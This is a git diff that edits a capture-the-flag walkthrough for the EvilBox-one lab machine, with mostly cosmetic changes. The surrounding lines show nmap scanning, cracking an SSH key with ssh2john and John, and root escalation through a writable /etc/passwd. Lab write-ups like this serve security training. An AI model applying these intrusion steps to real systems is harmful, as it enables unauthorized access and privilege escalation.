@@ -1,8 +1,9 @@
 # PG Play: [EvilBox-one](https://portal.offensive-security.com/labs/play)
 
+![image](https://user-images.githubusercontent.com/87611022/180659095-75dc4574-0a14-4866-8756-cae67ee8616a.png)
+
 As usual we start by port scanning the machine:
 
-Anyways to the port scanning:
 ```
 nmap -p22,80 -sV -sC -T4 -Pn -oA 192.168.204.212 192.168.204.212
 Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-24 11:49 EDT
@@ -152,7 +153,7 @@ unfortunately it didn't work because it asks for a password, since we don't have
 first we have to convert the key to a hash so __John__ can crack it:
 ```
 ┌──(root💀kali)-[~/tryhackme/rooms/evilbox]
-└─# python3 /root/tryhackme/rooms/overpass/ssh2john.py id_rsa                                                                                                                                                                          126 ⨯
+└─# python3 ssh2john.py id_rsa                                                                                                                                                                          126 ⨯
 id_rsa:$sshng$0$8$9FB14B3F3D04E90E$1192$bae426d821487bf7994f9a4dc90ebe2b551aa7f15859cb04925cce36dfb1e003ba1668c5991f11529c0c1eeae66d10ba86aca88aff
 .
 .
@@ -182,7 +183,7 @@ mowree@EvilBoxOne:~$ ls
 local.txt
 ```
 
-next step is to find possible privilege escalation paths, I used linpeas which and found out that /etc/passwd is writeable by our user:
+next step is to find possible privilege escalation paths, I used [linpeas](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) and found out that /etc/passwd is writeable by our user:
 
 ```
 ╔══════════╣ Permissions in init, init.d, systemd, and rc.d
@@ -192,7 +193,7 @@ next step is to find possible privilege escalation paths, I used linpeas which a
 ═╣ Writable passwd file? ................ /etc/passwd is writable
 ```
 
-So we can simply make a user with root privilege and __su__ to it.
+So we can simply create a user with root privileges and __su__ to it.
 
 first we create the passwd on our attacking machine using __openssl__
 
